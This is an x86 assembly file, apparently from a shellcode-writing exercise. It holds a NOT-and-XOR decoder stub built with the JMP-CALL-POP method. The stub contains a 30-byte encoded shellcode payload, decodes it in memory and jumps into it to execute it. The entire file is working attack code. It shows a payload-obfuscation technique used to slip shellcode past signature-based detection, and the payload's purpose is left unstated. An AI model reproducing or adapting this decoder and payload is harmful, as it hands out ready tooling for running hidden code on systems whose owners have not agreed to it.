;A simple NOT and XOR decoder
;Using the JUMP-CALL-POP method

global _start

;JUMP PART
_start:
    xor ecx, ecx                    ;Initialize ecx to NULL
    mov cl, shellcodeLen            ;Initialize cl to the shellcode length
    jmp stage1                      ;Jump to the CALL part (stage1)

;POP PART
stage2:
    pop esi                         ;pop the shellcode inside esi

;DECRYPTION PART
stage3:
    not BYTE [esi]                  ;Start the decryption process by a NOT on the value inside esi
    xor BYTE [esi], 0xAA            ;Then XOR the value pointed in esi by 0xAA
    inc esi                         ;Increment the address stores inside esi
    loop stage3                     ;loop until the cl == 0, which means the shellcode is decoded

    jmp shellcode                   ;Jump to the decoded shellcode and execute it

;CALL PART
stage1:
    call stage2                     ;Call the second part (stage2)
    ;The encoded shellcode is stored here
    shellcode: db 0x64,0x8e,0x6,0x3d,0x37,0x34,0x26,0x3d,0x3d,0x37,0x3c,0x3b,0x7a,0x3d,0x7a,0x7a,0x7a,0x7a,0xdc,0xb6,0x64,0x9c,0x64,0x87,0x64,0x95,0xe5,0x5e,0x98,0xd5
    shellcodeLen: equ $-shellcode   ;This lign is used to get the shellcode length